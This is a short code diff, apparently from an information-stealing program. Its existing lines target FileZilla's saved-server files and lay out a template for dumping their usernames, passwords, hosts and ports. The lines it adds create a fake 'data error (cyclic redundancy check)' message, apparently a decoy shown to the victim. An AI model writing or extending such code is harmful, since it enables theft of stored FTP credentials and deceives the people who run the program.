@@ -98,3 +98,9 @@ class FileZillaConfig:
     SitesPath = rf"{user_profile}\AppData\Roaming\FileZilla"
     DataFiles = ("recentservers.xml", "sitemanager.xml")
     FileZillaData = "Name: {0}\nUser: {1}\nPassword: {2}\nHost: {3}\nPort: {4}\n\n"
+
+
+class MessageConfig:
+
+    MessageTitle = "0x17"
+    MessageDescription = "ERROR_CRC: Data error (cyclic redundancy check)."
